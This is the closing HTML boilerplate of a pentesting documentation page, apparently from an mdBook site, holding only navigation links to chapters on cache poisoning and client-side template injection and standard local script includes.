                    <a rel="prev" href="../pentesting-web/cache-deception/cache-poisoning-to-dos.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/client-side-template-injection-csti.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
